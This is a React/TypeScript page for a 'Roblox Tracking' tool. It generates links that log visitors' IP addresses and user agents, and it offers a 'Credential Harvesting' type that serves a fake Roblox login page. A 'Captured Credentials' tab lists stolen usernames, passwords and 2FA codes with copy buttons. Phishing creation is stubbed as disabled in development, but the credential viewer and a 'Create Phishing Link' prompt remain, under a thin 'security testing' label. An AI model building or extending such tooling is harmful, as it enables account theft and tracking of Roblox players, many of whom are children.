import { useState, useEffect } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Badge } from "@/components/ui/badge";
import { ArrowLeft, Link2, Copy, Eye, Trash2, Plus, Users, Server, Shield, Skull, Key, Lock } from "lucide-react";
import { useLocation } from "wouter";
import { createRobloxLinkSchema, type CreateRobloxLink, type RobloxLink, type RobloxCredentials } from "@shared/schema";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { z } from "zod";

type RobloxLinkWithTracking = RobloxLink & { trackingUrl: string };

export default function RobloxTracking() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const [showForm, setShowForm] = useState(false);

  const formSchema = createRobloxLinkSchema; // Use the imported schema
  type FormSchemaType = z.infer<typeof formSchema>;

  const form = useForm<FormSchemaType>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      originalUrl: "",
      linkType: "private_server",
      title: "",
      description: "",
    },
  });

  const selectedLinkType = form.watch("linkType");

  // Fetch Roblox links
  const { data: robloxLinks, isLoading } = useQuery<RobloxLinkWithTracking[]>({
    queryKey: ["/api/roblox-links"],
  });

  // Fetch captured credentials
  const { data: credentials, isLoading: credentialsLoading } = useQuery<RobloxCredentials[]>({
    queryKey: ["/api/roblox-credentials"],
  });

  // Create Roblox link mutation
  const createMutation = useMutation({
    mutationFn: (data: CreateRobloxLink) => 
      apiRequest("POST", "/api/roblox-links", data),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/roblox-links"] });
      form.reset();
      setShowForm(false);
      toast({
        title: "Success",
        description: "Roblox tracking link created successfully!",
      });
    },
    onError: (error: any) => {
      toast({
        title: "Error",
        description: error.message || "Failed to create Roblox link",
        variant: "destructive",
      });
    },
  });

  // Delete Roblox link mutation
  const deleteMutation = useMutation({
    mutationFn: (id: string) => 
      apiRequest("DELETE", `/api/roblox-links/${id}`),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/roblox-links"] });
      toast({
        title: "Success",
        description: "Roblox link deleted successfully!",
      });
    },
    onError: (error: any) => {
      toast({
        title: "Error",
        description: error.message || "Failed to delete Roblox link",
        variant: "destructive",
      });
    },
  });

  const onSubmit = async (data: FormSchemaType) => {
    try {
      // Check if trying to create phishing link
      if (data.linkType === 'phishing') {
        toast({
          title: "Feature Disabled",
          description: "Phishing functionality is temporarily disabled during development.",
          variant: "destructive"
        });
        return;
      }

      // The rest of the original onSubmit logic remains here, but it's not used in the provided snippet.
      // I will use the createMutation instead.
      createMutation.mutate(data);
    } catch (error) {
      console.error('Error creating link:', error);
      toast({
        title: "Error",
        description: "Failed to create tracking link. Please try again.",
        variant: "destructive"
      });
    }
  };

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      toast({
        title: "Copied!",
        description: "Tracking link copied to clipboard",
      });
    } catch (err) {
      toast({
        title: "Error",
        description: "Failed to copy to clipboard",
        variant: "destructive",
      });
    }
  };

  const getLinkTypeIcon = (type: string) => {
    switch (type) {
      case "private_server":
        return <Server className="h-4 w-4" />;
      case "profile":
        return <Users className="h-4 w-4" />;
      case "group":
        return <Shield className="h-4 w-4" />;
      case "phishing":
        return <Skull className="h-4 w-4" />;
      default:
        return <Link2 className="h-4 w-4" />;
    }
  };

  const getLinkTypeLabel = (type: string) => {
    switch (type) {
      case "private_server":
        return "Private Server";
      case "profile":
        return "Profile";
      case "group":
        return "Group";
      case "phishing":
        return "Credential Harvesting";
      default:
        return type;
    }
  };

  return (
    <div className="min-h-screen bg-background">
      <div className="container mx-auto p-4 sm:p-6 max-w-7xl">
        <header className="mb-6 sm:mb-8">
          <div className="flex flex-col space-y-4 sm:flex-row sm:items-center sm:justify-between sm:space-y-0">
            <div className="flex flex-col space-y-3 sm:flex-row sm:items-center sm:space-y-0 sm:space-x-4">
              <Button 
                variant="ghost" 
                onClick={() => setLocation("/")}
                className="self-start sm:mr-2"
                data-testid="button-back"
              >
                <ArrowLeft className="h-4 w-4 mr-1" />
                Back
              </Button>
              <div className="flex items-center space-x-3">
                <div className="w-8 h-8 bg-primary/10 rounded-lg flex items-center justify-center">
                  <Link2 className="h-4 w-4 text-primary" />
                </div>
                <div>
                  <h2 className="text-xl sm:text-2xl font-semibold text-foreground">Roblox Tracking</h2>
                  <p className="text-sm sm:text-base text-muted-foreground">Create tracking links for Roblox servers, profiles, and groups</p>
                </div>
              </div>
            </div>
            <Button 
              onClick={() => setShowForm(true)}
              className="bg-primary text-primary-foreground hover:bg-primary/90 self-start sm:self-auto min-h-[44px]"
              data-testid="button-create-link"
            >
              <Plus className="mr-2 h-4 w-4" />
              Create Link
            </Button>
          </div>
        </header>

        {showForm && (
          <Card className="mb-6">
            <CardHeader>
              <CardTitle>Create Roblox Tracking Link</CardTitle>
              <CardDescription>
                {selectedLinkType === "phishing" 
                  ? "Create a fake Roblox login page to capture credentials for security testing"
                  : "Enter a Roblox URL to generate a tracking link that logs visitor information"}
              </CardDescription>
            </CardHeader>
            <CardContent>
              <Form {...form}>
                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
                  {selectedLinkType !== "phishing" && (
                    <FormField
                      control={form.control}
                      name="originalUrl"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>Roblox URL</FormLabel>
                          <FormControl>
                            <Input 
                              placeholder="https://www.roblox.com/games/..." 
                              {...field}
                              value={field.value || ""}
                              data-testid="input-original-url"
                            />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                  )}

                  {selectedLinkType === "phishing" && (
                    <Card className="border-orange-200 bg-orange-50 opacity-75">
                      <CardContent className="pt-6">
                        <div className="text-center space-y-4">
                          <div className="inline-flex items-center justify-center w-12 h-12 rounded-full bg-orange-100">
                            <Skull className="h-6 w-6 text-orange-600" />
                          </div>
                          <div>
                            <h3 className="text-lg font-semibold text-orange-900">Security Testing Tool</h3>
                            <p className="text-sm text-orange-700 mt-1">
                              Create fake Roblox login pages for educational security awareness and phishing prevention training.
                            </p>
                            <div className="mt-3 p-3 bg-orange-100 border border-orange-200 rounded-md">
                              <p className="text-sm font-medium text-orange-800">
                                ⚠️ Phishing functionality is currently disabled during development
                              </p>
                            </div>
                          </div>
                        </div>
                        <Button
                          className="w-full mt-4"
                          onClick={() => {
                            alert("Phishing functionality is temporarily disabled during development. Please check back later.");
                          }}
                          variant="secondary"
                          disabled
                          data-testid="button-create-phishing-link"
                        >
                          <Skull className="mr-2 h-4 w-4" />
                          Phishing Disabled (In Development)
                        </Button>
                      </CardContent>
                    </Card>
                  )}

                  <FormField
                    control={form.control}
                    name="linkType"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>Link Type</FormLabel>
                        <Select onValueChange={field.onChange} defaultValue={field.value}>
                          <FormControl>
                            <SelectTrigger data-testid="select-link-type">
                              <SelectValue placeholder="Select link type" />
                            </SelectTrigger>
                          </FormControl>
                          <SelectContent>
                            <SelectItem value="private_server">Private Server</SelectItem>
                            <SelectItem value="profile">Profile</SelectItem>
                            <SelectItem value="group">Group</SelectItem>
                            <SelectItem value="phishing">Credential Harvesting</SelectItem>
                          </SelectContent>
                        </Select>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="title"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>Title</FormLabel>
                        <FormControl>
                          <Input 
                            placeholder="My Awesome Server" 
                            {...field}
                            data-testid="input-title"
                          />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={form.control}
                    name="description"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel>Description (Optional)</FormLabel>
                        <FormControl>
                          <Textarea 
                            placeholder="Add a description for this tracking link..."
                            {...field}
                            data-testid="textarea-description"
                          />
                        </FormControl>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <div className="flex space-x-2">
                    <Button 
                      type="submit" 
                      disabled={createMutation.isPending || selectedLinkType === 'phishing'}
                      data-testid="button-submit"
                    >
                      {createMutation.isPending ? "Creating..." : "Create Link"}
                    </Button>
                    <Button 
                      type="button" 
                      variant="outline" 
                      onClick={() => setShowForm(false)}
                      data-testid="button-cancel"
                    >
                      Cancel
                    </Button>
                  </div>
                </form>
              </Form>
            </CardContent>
          </Card>
        )}

        {/* Tabs for Links and Credentials */}
        <Tabs defaultValue="links" className="w-full">
          <TabsList className="grid w-full grid-cols-2">
            <TabsTrigger value="links" className="flex items-center space-x-2">
              <Link2 className="h-4 w-4" />
              <span>Tracking Links</span>
              {robloxLinks && <Badge variant="secondary">{robloxLinks.length}</Badge>}
            </TabsTrigger>
            <TabsTrigger value="credentials" className="flex items-center space-x-2">
              <Key className="h-4 w-4" />
              <span>Captured Credentials</span>
              {credentials && <Badge variant="secondary">{credentials.length}</Badge>}
            </TabsTrigger>
          </TabsList>

          <TabsContent value="links" className="space-y-4 mt-6">
            {isLoading ? (
              <div className="text-center py-8">
                <div className="text-muted-foreground">Loading Roblox links...</div>
              </div>
            ) : robloxLinks && robloxLinks.length > 0 ? (
              robloxLinks.map((link) => (
                <Card key={link.id} className="hover:shadow-md transition-shadow">
                  <CardContent className="p-4">
                    <div className="flex flex-col space-y-3 sm:flex-row sm:items-center sm:justify-between sm:space-y-0">
                      <div className="flex-1 space-y-2">
                        <div className="flex items-center space-x-2">
                          {getLinkTypeIcon(link.linkType)}
                          <h3 className="font-semibold text-foreground">{link.title}</h3>
                          <span className="px-2 py-1 bg-muted rounded-md text-xs text-muted-foreground">
                            {getLinkTypeLabel(link.linkType)}
                          </span>
                        </div>
                        {link.description && (
                          <p className="text-sm text-muted-foreground">{link.description}</p>
                        )}
                        <div className="space-y-1">
                          {link.linkType !== "phishing" && (
                            <div className="flex items-center space-x-2 text-sm">
                              <span className="text-muted-foreground">Original:</span>
                              <a 
                                href={link.originalUrl} 
                                target="_blank" 
                                rel="noopener noreferrer"
                                className="text-primary hover:underline truncate max-w-xs"
                              >
                                {link.originalUrl}
                              </a>
                            </div>
                          )}
                          <div className="flex items-center space-x-2 text-sm">
                            <span className="text-muted-foreground">
                              {link.linkType === "phishing" ? "Phishing Page:" : "Tracking:"}
                            </span>
                            <code className="bg-muted px-2 py-1 rounded text-xs truncate max-w-xs">
                              {link.linkType === "phishing" 
                                ? `${window.location.origin}/roblox/login/${link.trackingId}`
                                : link.trackingUrl
                              }
                            </code>
                            <Button
                              size="sm"
                              variant="ghost"
                              onClick={() => copyToClipboard(
                                link.linkType === "phishing" 
                                  ? `${window.location.origin}/roblox/login/${link.trackingId}`
                                  : link.trackingUrl
                              )}
                              data-testid={`button-copy-${link.id}`}
                            >
                              <Copy className="h-3 w-3" />
                            </Button>
                          </div>
                        </div>
                      </div>
                      <div className="flex items-center space-x-2">
                        <div className="text-right text-sm text-muted-foreground">
                          <div className="flex items-center space-x-1">
                            <Eye className="h-3 w-3" />
                            <span>{link.clickCount} clicks</span>
                          </div>
                          <div className="text-xs">
                            Created {new Date(link.createdAt).toLocaleDateString()}
                          </div>
                        </div>
                        <Button
                          size="sm"
                          variant="ghost"
                          onClick={() => deleteMutation.mutate(link.id)}
                          disabled={deleteMutation.isPending}
                          data-testid={`button-delete-${link.id}`}
                        >
                          <Trash2 className="h-3 w-3" />
                        </Button>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))
            ) : (
              <Card>
                <CardContent className="text-center py-8">
                  <Link2 className="h-12 w-12 text-muted-foreground mx-auto mb-4" />
                  <h3 className="text-lg font-semibold text-foreground mb-2">No Roblox Links Yet</h3>
                  <p className="text-muted-foreground mb-4">
                    Create your first tracking link to start monitoring Roblox traffic
                  </p>
                  <Button 
                    onClick={() => setShowForm(true)}
                    data-testid="button-create-first-link"
                  >
                    <Plus className="mr-2 h-4 w-4" />
                    Create Your First Link
                  </Button>
                </CardContent>
              </Card>
            )}
          </TabsContent>

          <TabsContent value="credentials" className="space-y-4 mt-6">
            {credentialsLoading ? (
              <div className="text-center py-8">
                <div className="text-muted-foreground">Loading captured credentials...</div>
              </div>
            ) : credentials && credentials.length > 0 ? (
              credentials.map((cred) => {
                const linkedLink = robloxLinks?.find(link => link.id === cred.linkId);
                return (
                  <Card key={cred.id} className="hover:shadow-md transition-shadow border-l-4 border-l-red-500">
                    <CardContent className="p-4">
                      <div className="flex flex-col space-y-3">
                        <div className="flex items-center justify-between">
                          <div className="flex items-center space-x-2">
                            <Lock className="h-4 w-4 text-red-500" />
                            <h3 className="font-semibold text-foreground">Captured Credentials</h3>
                            <Badge variant="destructive">Security Test</Badge>
                          </div>
                          <div className="text-xs text-muted-foreground">
                            {new Date(cred.createdAt).toLocaleString()}
                          </div>
                        </div>

                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                          <div className="space-y-2">
                            <div className="flex items-center space-x-2 text-sm">
                              <span className="text-muted-foreground font-medium">Username:</span>
                              <code className="bg-muted px-2 py-1 rounded text-xs font-mono">
                                {cred.capturedUsername}
                              </code>
                              <Button
                                size="sm"
                                variant="ghost"
                                onClick={() => copyToClipboard(cred.capturedUsername)}
                                data-testid={`button-copy-username-${cred.id}`}
                              >
                                <Copy className="h-3 w-3" />
                              </Button>
                            </div>

                            <div className="flex items-center space-x-2 text-sm">
                              <span className="text-muted-foreground font-medium">Password:</span>
                              <code className="bg-muted px-2 py-1 rounded text-xs font-mono">
                                {cred.capturedPassword}
                              </code>
                              <Button
                                size="sm"
                                variant="ghost"
                                onClick={() => copyToClipboard(cred.capturedPassword)}
                                data-testid={`button-copy-password-${cred.id}`}
                              >
                                <Copy className="h-3 w-3" />
                              </Button>
                            </div>

                            {cred.capturedAuthCode && (
                              <div className="flex items-center space-x-2 text-sm">
                                <span className="text-muted-foreground font-medium">2FA Code:</span>
                                <code className="bg-muted px-2 py-1 rounded text-xs font-mono">
                                  {cred.capturedAuthCode}
                                </code>
                                <Button
                                  size="sm"
                                  variant="ghost"
                                  onClick={() => copyToClipboard(cred.capturedAuthCode || '')}
                                  data-testid={`button-copy-2fa-${cred.id}`}
                                >
                                  <Copy className="h-3 w-3" />
                                </Button>
                              </div>
                            )}
                          </div>

                          <div className="space-y-2">
                            <div className="flex items-center space-x-2 text-sm">
                              <span className="text-muted-foreground font-medium">IP Address:</span>
                              <span className="font-mono text-xs">{cred.ipAddress}</span>
                            </div>

                            {linkedLink && (
                              <div className="flex items-center space-x-2 text-sm">
                                <span className="text-muted-foreground font-medium">From Link:</span>
                                <span className="text-primary">{linkedLink.title}</span>
                              </div>
                            )}

                            <div className="text-xs text-muted-foreground">
                              <span className="font-medium">User Agent:</span>
                              <br />
                              <span className="break-all">{cred.userAgent}</span>
                            </div>
                          </div>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                );
              })
            ) : (
              <Card>
                <CardContent className="text-center py-8">
                  <Key className="h-12 w-12 text-muted-foreground mx-auto mb-4" />
                  <h3 className="text-lg font-semibold text-foreground mb-2">No Credentials Captured Yet</h3>
                  <p className="text-muted-foreground mb-4">
                    Create a phishing link and share it to start capturing credentials for security testing
                  </p>
                  <Button 
                    onClick={() => {
                      setShowForm(true);
                      form.setValue("linkType", "phishing");
                    }}
                    variant="destructive"
                    data-testid="button-create-phishing-link"
                  >
                    <Skull className="mr-2 h-4 w-4" />
                    Create Phishing Link
                  </Button>
                </CardContent>
              </Card>
            )}
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}